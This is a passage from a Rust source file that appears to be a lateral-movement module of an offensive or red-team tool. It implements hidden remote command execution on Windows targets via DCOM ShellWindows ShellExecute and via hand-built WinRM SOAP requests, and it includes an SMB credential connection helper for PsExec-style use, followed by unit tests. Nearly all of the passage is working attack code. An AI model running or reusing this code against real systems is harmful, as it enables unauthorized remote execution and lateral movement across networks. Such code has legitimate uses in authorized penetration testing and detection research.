        identity.Flags = winapi::um::winnt::SEC_WINNT_AUTH_IDENTITY_UNICODE;

        // Set up COAUTHINFO
        let mut auth_info: winapi::um::objidl::COAUTHINFO = unsafe { std::mem::zeroed() };
        auth_info.dwAuthnSvc = RPC_C_AUTHN_WINNT;
        auth_info.dwAuthzSvc = RPC_C_AUTHZ_NONE;
        auth_info.pwszServerPrincName = ptr::null_mut();
        auth_info.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
        auth_info.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        auth_info.pAuthIdentityData = &mut identity as *mut _;
        auth_info.dwCapabilities = 0;

        server_info.pAuthInfo = &mut auth_info;
        (identity, user_part_owned, pass_wide, domain_wide)
    } else {
        let empty: Vec<u16> = Vec::new();
        unsafe { std::mem::zeroed::<winapi::um::objidl::COAUTHIDENTITY>() }
        (unsafe { std::mem::zeroed() }, empty.clone(), empty.clone(), empty)
    };

    let mut mq: winapi::um::combaseapi::MULTI_QI = unsafe { std::mem::zeroed() };
    mq.pIID = &IID_IDISPATCH as *const _ as *const _;

    let hr = unsafe {
        co_create_instance_ex(
            &CLSID_SHELL_WINDOWS,
            ptr::null_mut(),
            CLSCTX_REMOTE_SERVER as u32,
            &mut server_info,
            1,
            &mut mq,
        )
    };
    if !SUCCEEDED(hr) || mq.pItf.is_null() {
        return Err(anyhow!(
            "CoCreateInstanceEx(ShellWindows) on {} failed: 0x{:08X}",
            target_host,
            hr as u32
        ));
    }
    let shell_dispatch: *mut IDispatch = mq.pItf as *mut IDispatch;

    // Set the proxy blanket for the remote interface.
    let hr = unsafe {
        CoSetProxyBlanket(
            shell_dispatch as *mut IUnknown,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            ptr::null_mut(),
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            ptr::null_mut(),
            EOAC_NONE,
        )
    };
    if !SUCCEEDED(hr) {
        unsafe { ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch); }
        return Err(anyhow!("CoSetProxyBlanket on ShellWindows failed: 0x{:08X}", hr as u32));
    }

    // ── Step 2: Get DISPID for "ShellExecute" ───────────────────────────
    let method_name = unsafe { wmi_alloc_bstr("ShellExecute") };
    let mut disp_id: i32 = 0;
    let hr = unsafe {
        ((*(*shell_dispatch).lpvtbl).get_ids_of_names)(
            shell_dispatch,
            &IID_NULL as *const _ as REFIID,
            &method_name as *const _ as *mut BSTR,
            1,
            0x0409, // LOCALE_USER_DEFAULT
            &mut disp_id,
        )
    };
    unsafe { wmi_free_bstr(method_name); }
    if !SUCCEEDED(hr) {
        unsafe { ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch); }
        return Err(anyhow!("GetIDsOfNames(ShellExecute) failed: 0x{:08X}", hr as u32));
    }

    // ── Step 3: Build Invoke parameters ─────────────────────────────────
    // ShellExecute(File, Args, Dir, Operation, Show) — 5 positional params.
    let cmd_bstr = unsafe { wmi_alloc_bstr("cmd.exe") };
    let args_bstr = unsafe { wmi_alloc_bstr(&format!("/c {}", command)) };
    let empty_bstr = unsafe { wmi_alloc_bstr("") };
    let open_bstr = unsafe { wmi_alloc_bstr("open") };

    // Build the DISPPARAMS: positional args are passed in reverse order.
    let mut var_cmd: VARIANT = unsafe { std::mem::zeroed() };
    var_cmd.n1.n2_mut().vt = VT_BSTR;
    *var_cmd.n1.n2_mut().n3.bstrVal_mut() = args_bstr;   // index 0 = Args
    let mut var_dir: VARIANT = unsafe { std::mem::zeroed() };
    var_dir.n1.n2_mut().vt = VT_BSTR;
    *var_dir.n1.n2_mut().n3.bstrVal_mut() = empty_bstr;  // index 1 = Dir (empty)
    let mut var_op: VARIANT = unsafe { std::mem::zeroed() };
    var_op.n1.n2_mut().vt = VT_BSTR;
    *var_op.n1.n2_mut().n3.bstrVal_mut() = open_bstr;    // index 2 = Operation
    let mut var_show: VARIANT = unsafe { std::mem::zeroed() };
    var_show.n1.n2_mut().vt = VT_I4;
    *var_show.n1.n2_mut().n3.lVal_mut() = 0;             // index 3 = Show (0 = SW_HIDE)
    let mut var_file: VARIANT = unsafe { std::mem::zeroed() };
    var_file.n1.n2_mut().vt = VT_BSTR;
    *var_file.n1.n2_mut().n3.bstrVal_mut() = cmd_bstr;   // index 4 = File

    // DISPPARAMS: args in reverse order (right-to-left for positional).
    #[repr(C)]
    struct DispParams {
        rgvarg: *mut VARIANT,
        rgdispid_named_args: *mut i32,
        c_args: u32,
        c_named_args: u32,
    }

    let mut disp_args: [VARIANT; 5] = [var_show, var_op, var_dir, var_cmd, var_file];
    let dp = DispParams {
        rgvarg: disp_args.as_mut_ptr(),
        rgdispid_named_args: ptr::null_mut(),
        c_args: 5,
        c_named_args: 0,
    };

    let mut ret_var: VARIANT = unsafe { std::mem::zeroed() };
    let hr = unsafe {
        ((*(*shell_dispatch).lpvtbl).invoke)(
            shell_dispatch,
            disp_id,
            &IID_NULL as *const _ as REFIID,
            0x0409,
            1, // DISPATCH_METHOD
            &dp as *const _ as *mut std::ffi::c_void,
            &mut ret_var,
            ptr::null_mut(),
            ptr::null_mut(),
        )
    };

    // Cleanup BSTRs
    unsafe {
        wmi_free_bstr(cmd_bstr);
        wmi_free_bstr(args_bstr);
        wmi_free_bstr(empty_bstr);
        wmi_free_bstr(open_bstr);
        ((*(*shell_dispatch).lpvtbl).release)(shell_dispatch);
    }

    if !SUCCEEDED(hr) {
        return Err(anyhow!(
            "ShellExecute Invoke on {} failed: 0x{:08X}",
            target_host,
            hr as u32
        ));
    }

    Ok(format!(
        "DcomExec: command launched on {} via ShellWindows DCOM",
        target_host
    ))
}

// ── WinRM Exec ─────────────────────────────────────────────────────────────

/// Execute a command on a remote host via WinRM SOAP requests.
///
/// Constructs a raw SOAP envelope conforming to the WS-Management protocol
/// and sends it to the WinRM service (default port 5985 for HTTP, 5986 for
/// HTTPS) on the target host.
pub async fn winrm_exec(
    target_host: &str,
    command: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Result<String> {
    // Build the SOAP envelope for a WinRM Create Shell.
    let soap_envelope = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsm="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <wsm:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</wsm:Action>
    <wsm:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</wsm:ResourceURI>
    <wsm:MaxEnvelopeSize s:mustUnderstand="true">153600</wsm:MaxEnvelopeSize>
    <wsm:OperationTimeout>PT60S</wsm:OperationTimeout>
  </s:Header>
  <s:Body>
    <rsp:Shell>
      <rsp:InputStreams>stdin</rsp:InputStreams>
      <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>
      <rsp:WorkingDirectory>C:\\</rsp:WorkingDirectory>
    </rsp:Shell>
  </s:Body>
</s:Envelope>"#
    );

    // Use the async reqwest client already in the dependency tree.
    let url = format!("http://{}:5985/wsman", target_host);

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .context("failed to build HTTP client for WinRM")?;

    let mut req = client
        .post(&url)
        .header("Content-Type", "application/soap+xml; charset=UTF-8")
        .header("WSMANIDENTIFY", "unauthenticated")
        .body(soap_envelope.clone());

    if let (Some(user), Some(pass)) = (username, password) {
        req = req.basic_auth(user, Some(pass));
    }

    let resp = req.send().await.context("failed to send WinRM Create request")?;

    if !resp.status().is_success() {
        let status = resp.status();
        let body = resp.text().await.unwrap_or_default();
        return Err(anyhow!("WinRM Create Shell failed: HTTP {} — {}", status, body));
    }

    // Extract the ShellId from the response.
    let resp_body = resp.text().await.context("failed to read WinRM response")?;
    let shell_id = extract_shell_id(&resp_body)?;

    // Now send the Execute command with the obtained ShellId.
    let cmd_envelope = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsm="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
            xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">
  <s:Header>
    <wsm:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</wsm:Action>
    <wsm:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</wsm:ResourceURI>
    <wsm:MaxEnvelopeSize s:mustUnderstand="true">153600</wsm:MaxEnvelopeSize>
    <wsm:OperationTimeout>PT60S</wsm:OperationTimeout>
    <wsm:SelectorSet>
      <wsm:Selector Name="ShellId">{}</wsm:Selector>
    </wsm:SelectorSet>
  </s:Header>
  <s:Body>
    <rsp:CommandLine>
      <rsp:Command>"cmd.exe"</rsp:Command>
      <rsp:Arguments>/c {}</rsp:Arguments>
    </rsp:CommandLine>
  </s:Body>
</s:Envelope>"#,
        shell_id, command
    );

    let mut req2 = client
        .post(&url)
        .header("Content-Type", "application/soap+xml; charset=UTF-8")
        .body(cmd_envelope);

    if let (Some(user), Some(pass)) = (username, password) {
        req2 = req2.basic_auth(user, Some(pass));
    }

    let resp2 = req2.send().await.context("failed to send WinRM Command request")?;

    if !resp2.status().is_success() {
        let status = resp2.status();
        return Err(anyhow!("WinRM Command failed: HTTP {}", status));
    }

    // Delete the shell to clean up (best-effort).
    let _ = delete_winrm_shell(&client, &url, &shell_id, username, password).await;

    Ok(format!(
        "WinRmExec: command executed on {} via WinRM (shell {})",
        target_host, shell_id
    ))
}

/// Extract the ShellId from a WinRM Create Shell SOAP response.
fn extract_shell_id(soap_response: &str) -> Result<String> {
    // Look for <wsm:Selector Name="ShellId">...</wsm:Selector>
    if let Some(start) = soap_response.find("Name=\"ShellId\"") {
        if let Some(content_start) = soap_response[start..].find('>') {
            let rest = &soap_response[start + content_start + 1..];
            if let Some(end) = rest.find('<') {
                return Ok(rest[..end].to_string());
            }
        }
    }
    // Fallback: look for UUID pattern.
    let uuid_start = soap_response.find("uuid:").or_else(|| soap_response.find('{'));
    if let Some(start) = uuid_start {
        let rest = &soap_response[start..];
        let uuid: String = rest.chars().take_while(|c| c.is_alphanumeric() || *c == '-' || *c == '{' || *c == '}' || *c == ':').collect();
        if !uuid.is_empty() {
            return Ok(uuid.trim_start_matches('{').trim_start_matches("uuid:").trim_end_matches('}').to_string());
        }
    }
    Err(anyhow!("failed to extract ShellId from WinRM response"))
}

/// Send a WinRM Delete Shell request to clean up.
async fn delete_winrm_shell(
    client: &reqwest::Client,
    url: &str,
    shell_id: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Result<()> {
    let envelope = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsm="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <wsm:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</wsm:Action>
    <wsm:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</wsm:ResourceURI>
    <wsm:OperationTimeout>PT30S</wsm:OperationTimeout>
    <wsm:SelectorSet>
      <wsm:Selector Name="ShellId">{}</wsm:Selector>
    </wsm:SelectorSet>
  </s:Header>
  <s:Body/>
</s:Envelope>"#,
        shell_id
    );

    let mut req = client
        .delete(url)
        .header("Content-Type", "application/soap+xml; charset=UTF-8")
        .body(envelope);

    if let (Some(user), Some(pass)) = (username, password) {
        req = req.basic_auth(user, Some(pass));
    }

    let _ = req.send().await;
    Ok(())
}

// ── Remote Credentials Helper ──────────────────────────────────────────────

/// Manages remote authentication via `WNetAddConnection2` for SMB-based
/// operations (PsExec).
struct RemoteCreds {
    connected: bool,
}

impl RemoteCreds {
    fn new(host: &str, username: &str, password: &str) -> Result<Self> {
        use winapi::um::winnetwk::{
            WNetAddConnection2W, NETRESOURCEW, RESOURCETYPE_ANY,
        };

        let remote = ipc_path(host);
        let user_w = wide(username);
        let pass_w = wide(password);

        let mut nr: NETRESOURCEW = unsafe { std::mem::zeroed() };
        nr.dwType = RESOURCETYPE_ANY;
        nr.lpRemoteName = remote.as_ptr() as *mut _;

        let ok = unsafe {
            WNetAddConnection2W(&mut nr, pass_w.as_ptr(), user_w.as_ptr(), 0)
        };

        if ok != 0 {
            return Err(anyhow!("WNetAddConnection2 failed: error {ok}"));
        }

        Ok(RemoteCreds { connected: true })
    }
}

impl Drop for RemoteCreds {
    fn drop(&mut self) {
        // Best-effort cleanup: cancel any network connections made.
        if self.connected {
            unsafe {
                winapi::um::winnetwk::WNetCancelConnection2W(
                    ptr::null_mut(),
                    0,
                    1, // FORCE
                );
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wide_string_is_null_terminated() {
        let w = wide("test");
        assert_eq!(*w.last().unwrap(), 0);
        assert_eq!(w.len(), 5); // "test" + null
    }

    #[test]
    fn ipc_path_format() {
        let w = ipc_path("10.0.0.1");
        let s = String::from_utf16_lossy(&w[..w.len() - 1]); // strip null
        assert_eq!(s, r"\\10.0.0.1\IPC$");
    }

    #[test]
    fn sc_path_format() {
        let w = sc_path("192.168.1.1");
        let s = String::from_utf16_lossy(&w[..w.len() - 1]);
        assert_eq!(s, r"\\192.168.1.1");
    }

    #[test]
    fn wmi_path_format() {
        let w = wmi_path("dc01");
        let s = String::from_utf16_lossy(&w[..w.len() - 1]);
        assert_eq!(s, r"\\dc01\root\cimv2");
    }

    #[test]
    fn extract_shell_id_finds_uuid() {
        let resp = r#"<wsm:Selector Name="ShellId">A1B2C3D4-E5F6-7890-ABCD-EF1234567890</wsm:Selector>"#;
        let id = extract_shell_id(resp).unwrap();
        assert_eq!(id, "A1B2C3D4-E5F6-7890-ABCD-EF1234567890");
    }

    #[test]
    fn extract_shell_id_returns_error_on_empty() {
        let resp = "<no>shell id here</no>";
        assert!(extract_shell_id(resp).is_err());
    }
}
